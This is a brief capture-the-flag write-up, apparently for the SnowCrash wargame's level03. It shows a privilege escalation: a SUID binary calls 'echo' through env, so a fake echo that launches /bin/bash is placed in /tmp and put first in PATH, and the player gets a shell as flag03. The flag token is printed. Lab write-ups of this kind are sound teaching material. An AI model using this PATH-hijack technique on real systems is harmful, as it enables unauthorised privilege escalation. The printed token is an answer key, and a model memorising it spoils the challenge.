There is a binary 32 bits file called : level03
The SUID bit is set.

When decompiling the program we see it executes this command with the system function :
```bash
/usr/bin/env echo Exploit me
```

Let's replace the echo command by a malicious echo.

1. First, let's create a file in /tmp that's called echo and let's write /bin/bash in it.
2. Then let's load our new path to echo to the PATH environment variable
```bash
> export PATH=/tmp:$PATH

Now the malicious echo will be found and executed first.

> ./level03
It works, we are now the flag03 user

> flag03@SnowCrash:~$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

*qi0maab88jeaj46qoumi7maus*